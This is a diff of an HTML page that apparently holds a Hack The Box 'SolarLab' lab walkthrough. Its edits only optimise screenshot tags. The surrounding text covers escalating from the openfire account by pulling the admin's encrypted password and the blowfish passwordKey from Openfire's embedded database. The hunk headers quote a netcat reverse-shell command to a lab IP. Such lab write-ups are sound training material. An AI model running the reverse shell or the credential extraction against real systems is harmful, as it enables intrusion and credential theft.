@@ -587,19 +617,19 @@ nc.exe 10.10.14.64 4444 -e cmd.exe</span>
 <span class="pg">solarlab\openfire</span></div>
   </div>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-45-f9c1599252.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="nc shell received as solarlab\openfire">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-45-f9c1599252.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-45-f9c1599252.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="nc shell received as solarlab\openfire" width="720" height="269"></picture>
 
   <h2>Privilege Escalation &#8212; openfire &#8594; Administrator</h2>
   <h3>Openfire embedded-db</h3>
   <p>As <code>openfire</code>, we can now access the Openfire directory. The <code>embedded-db</code> directory contains the database files:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-46-3db7029967.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="C:\Program Files\Openfire\embedded-db directory listing">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-47-c6e3a8defe.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="openfire.script file showing INSERT statements">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-46-3db7029967.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-46-3db7029967.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="C:\Program Files\Openfire\embedded-db directory listing" width="720" height="293"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-47-c6e3a8defe.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-47-c6e3a8defe.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="openfire.script file showing INSERT statements" width="720" height="359"></picture>
 
   <p>The <code>openfire.script</code> contains the <strong>OFUSER</strong> table with the admin's encrypted password:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-48-76f4e72ab9.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="INSERT INTO OFUSER showing admin encrypted password hash">
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-49-2bbf335d98.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="OFUSER table structure and data">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-48-76f4e72ab9.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-48-76f4e72ab9.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="INSERT INTO OFUSER showing admin encrypted password hash" width="697" height="169"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-49-2bbf335d98.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-49-2bbf335d98.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="OFUSER table structure and data" width="720" height="257"></picture>
 
   <div class="terminal">
     <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">admin encrypted password</span></div>
@@ -610,7 +640,7 @@ nc.exe 10.10.14.64 4444 -e cmd.exe</span>
   <h3>Finding the blowfish key</h3>
   <p>The OFPROPERTY table in the same script contains the <code>passwordKey</code> used for blowfish encryption:</p>
 
-<img loading="lazy" decoding="async" src="assets/htb-solarlab/img-50-2b1f1f4bc5.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="INSERT INTO OFPROPERTY showing passwordKey=hGXiFzsKaAeYLjn">
+<picture data-img-optimized="1"><source srcset="assets/htb-solarlab/img-50-2b1f1f4bc5.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-solarlab/img-50-2b1f1f4bc5.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="INSERT INTO OFPROPERTY showing passwordKey=hGXiFzsKaAeYLjn" width="720" height="245"></picture>
 
   <div class="terminal">
     <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">passwordKey from OFPROPERTY</span></div>
